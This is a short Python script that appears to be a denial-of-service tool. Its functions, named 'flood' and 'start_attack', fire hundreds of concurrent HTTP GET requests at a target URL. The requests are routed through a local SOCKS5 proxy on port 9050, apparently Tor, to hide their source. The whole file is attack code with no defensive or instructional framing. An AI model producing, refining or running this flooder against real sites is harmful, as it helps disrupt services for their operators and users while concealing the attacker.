import asyncio
import aiohttp
import socks
from aiohttp_socks import ProxyConnector


connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')

async def flood(url, semaphore):
    async with semaphore:
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url, timeout=2) as response:
                    return f"Target: {url} | Status: {response.status}"
        except Exception as e:
            return f"Error: {e}"

async def start_attack(url, count=500):
    semaphore = asyncio.Semaphore(50) 
    tasks = [flood(url, semaphore) for _ in range(count)]
    return await asyncio.gather(*tasks)
